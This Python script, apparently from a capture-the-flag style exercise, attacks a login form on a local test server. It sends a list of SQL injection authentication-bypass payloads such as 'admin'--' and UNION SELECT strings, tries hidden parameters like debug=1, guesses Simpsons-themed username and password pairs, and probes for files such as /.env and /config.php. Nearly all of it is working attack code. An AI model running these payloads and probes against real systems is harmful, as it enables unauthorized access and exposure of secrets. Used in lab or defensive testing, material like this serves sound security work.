import requests
import re

# Target configuration
target_url = "http://127.0.0.1:32989/index.php"
base_url = "http://127.0.0.1:32989"

print("EXTRACTING FULL RESPONSE CONTENT")
print("=" * 80)

# Get POST response with any credentials to see the full message
resp = requests.post(target_url, data={"username": "admin", "password": "admin"}, timeout=10)

print("Full response body:")
print("-" * 40)
print(resp.text)
print("-" * 40)

# Extract the dynamic part
match = re.search(r'</form>(.*?)</html>', resp.text, re.DOTALL)
if match:
    print("\n\nDynamic content after form:")
    print(repr(match.group(1)))

# Look for internal employee indicators
print("\n\n[2] SEARCHING FOR INTERNAL EMPLOYEE HINTS")
print("-" * 40)

# Check if there's any reference to internal employees or specific users
internal_keywords = ['internal', 'employee', 'staff', 'worker', 'insider', 'authorized']
for keyword in internal_keywords:
    if keyword in resp.text.lower():
        # Find context around the keyword
        idx = resp.text.lower().find(keyword)
        context = resp.text[max(0, idx-50):idx+50]
        print(f"Found '{keyword}': ...{context}...")

# 3. Try different authentication bypass techniques
print("\n\n[3] ADVANCED AUTHENTICATION BYPASS ATTEMPTS")
print("-" * 40)

bypass_attempts = [
    ("admin'--", "anything"),
    ("admin' #", "anything"),
    ("admin'/*", "anything"),
    ("admin' AND 1=1#", "anything"),
    ("admin' AND '1'='1'--", "anything"),
    ("' OR ''='", "' OR ''='"),
    ("'=''", "'=''"),
    ("admin\"--", "anything"),
    ("admin\"#", "anything"),
    ("1' OR '1'='1' LIMIT 1--", "anything"),
    ("admin' UNION SELECT null--", "anything"),
    ("admin' OR 1=1 LIMIT 1--", "anything"),
]

print("\nBypass attempts (all should show same 'Access Restricted' message):")
for user, pwd in bypass_attempts:
    r = requests.post(target_url, data={"username": user, "password": pwd}, timeout=10)
    # Check if there's anything after the restricted message
    if 'Access Restricted' in r.text:
        # Look for anything unusual
        unusual = "[!] UNUSUAL" if len(r.text) != 3178 else ""
        print(f"  {user[:30]:30}: Length={len(r.text)} {unusual}")

# 4. Check for hidden form fields or additional parameters
print("\n\n[4] CHECKING FOR HIDDEN PARAMETERS")
print("-" * 40)

hidden_params_tests = [
    {"username": "admin", "password": "admin", "admin": "1"},
    {"username": "admin", "password": "admin", "login": "1"},
    {"username": "admin", "password": "admin", "debug": "1"},
    {"username": "admin", "password": "admin", "internal": "1"},
    {"username": "admin", "password": "admin", "employee": "1"},
    {"username": "internal", "password": "employee"},
    {"username": "employee", "password": "internal"},
    {"username": "staff", "password": "staff"},
]

for data in hidden_params_tests:
    r = requests.post(target_url, data=data, timeout=10)
    if len(r.text) != 3178:
        print(f"[!] Different response with {data}: Length={len(r.text)}")
        # Print the difference
        print(f"    Response excerpt: {r.text[3000:]}")

# 5. Check response headers for clues
print("\n\n[5] RESPONSE HEADERS ANALYSIS")
print("-" * 40)

r = requests.post(target_url, data={"username": "admin", "password": "admin"}, timeout=10)
print("Headers:")
for header, value in r.headers.items():
    print(f"  {header}: {value}")

# 6. Check for other endpoints or files
print("\n\n[6] CHECKING FOR OTHER ENDPOINTS")
print("-" * 40)

endpoints_to_check = [
    "/",
    "/index.php",
    "/login.php",
    "/admin.php",
    "/internal.php",
    "/employee.php",
    "/staff.php",
    "/config.php",
    "/.env",
    "/robots.txt",
]

for endpoint in endpoints_to_check:
    try:
        r = requests.get(f"{base_url}{endpoint}", timeout=10)
        print(f"  {endpoint}: Status={r.status_code}, Length={len(r.text)}")
    except Exception as e:
        print(f"  {endpoint}: Error - {str(e)[:30]}")

# 7. Simpsons internal employee names
print("\n\n[7] SIMPSONS POWER PLANT EMPLOYEES")
print("-" * 40)

# These are characters known to work at the Springfield Nuclear Power Plant
power_plant_employees = [
    ("homer", "homer"),
    ("homer", "simpson"),
    ("simpson", "homer"),
    ("burns", "burns"),
    ("burns", "montgomery"),
    ("smithers", "smithers"),
    ("smithers", "waylon"),
    ("carl", "carl"),
    ("carlson", "carl"),
    ("lenny", "lenny"),
    ("leonard", "lenny"),
    ("snpp", "snpp"),
    ("sector", "7g"),
    ("nuclear", "plant"),
    ("burns", "excellent"),
]

for user, pwd in power_plant_employees:
    r = requests.post(target_url, data={"username": user, "password": pwd}, timeout=10)
    # Check if there's any variation in response
    if len(r.text) != 3178:
        print(f"[!] FOUND DIFFERENCE with {user}/{pwd}: Length={len(r.text)}")
        print(f"    Response tail: {r.text[-200:]}")
    else:
        print(f"  {user}/{pwd}: Same (Length={len(r.text)})")

# 8. Extract exact restricted message
print("\n\n[8] EXACT RESTRICTED MESSAGE")
print("-" * 40)

r = requests.post(target_url, data={"username": "test", "password": "test"}, timeout=10)
if 'Access Restricted' in r.text:
    match = re.search(r'Access Restricted.*?(?=<|$)', r.text, re.DOTALL)
    if match:
        print(f"Message found: {match.group(0)}")
    else:
        # Extract around the message
        idx = r.text.find('Access Restricted')
        print(f"Context: {r.text[idx:idx+100]}")

